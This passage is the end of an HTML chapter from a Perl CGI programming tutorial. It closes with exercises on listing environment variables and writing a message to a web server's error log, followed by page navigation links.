(sort(keys(%ENV))) { ... }</tt>.

<li>Write a CGI script that prints &quot;Thanks, you're doing

a great job!&quot; in your Web server's error log file.

</ol>

<hr>



<center><p><a HREF="ch18.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch18.htm"><img SRC="pc.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pc.gif" BORDER="0" HEIGHT="88" WIDTH="140"></a>

<a HREF="#CONTENTS"><img SRC="cc.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/cc.gif" BORDER="0" HEIGHT="88" WIDTH="140"></a>

<a HREF="index-1.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/index-1.htm"><img SRC="hb.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/hb.gif" BORDER="0" HEIGHT="88" WIDTH="140"></a>

<a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm"><img SRC="nc.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/nc.gif" BORDER="0" HEIGHT="88" WIDTH="140"></a>

<hr WIDTH="100%"></p></center>

</body>

</html>

